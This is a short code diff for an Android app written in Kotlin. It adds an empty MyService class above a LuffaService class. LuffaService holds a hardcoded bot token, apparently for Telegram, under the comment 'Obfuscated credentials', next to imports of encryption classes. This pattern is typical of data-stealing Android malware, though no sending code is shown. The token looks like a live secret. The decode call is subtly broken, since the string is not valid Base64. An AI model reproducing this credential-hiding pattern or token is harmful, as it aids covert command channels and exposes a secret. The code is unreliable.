@@ -32,6 +32,16 @@ import javax.crypto.Cipher
 import javax.crypto.spec.IvParameterSpec
 import javax.crypto.spec.SecretKeySpec
 
+
+import android.app.Service
+import android.content.Intent
+import android.os.IBinder
+
+class MyService : Service() {
+    override fun onBind(intent: Intent?): IBinder? = null
+}
+
+
 class LuffaService : Service() {
     // Obfuscated credentials
     private val BOT_TOKEN = String(Base64.decode("8840980473:AAEmlnzZ1swP8Dtd0btYgScRq89Z2sw84HQ", Base64.DEFAULT))
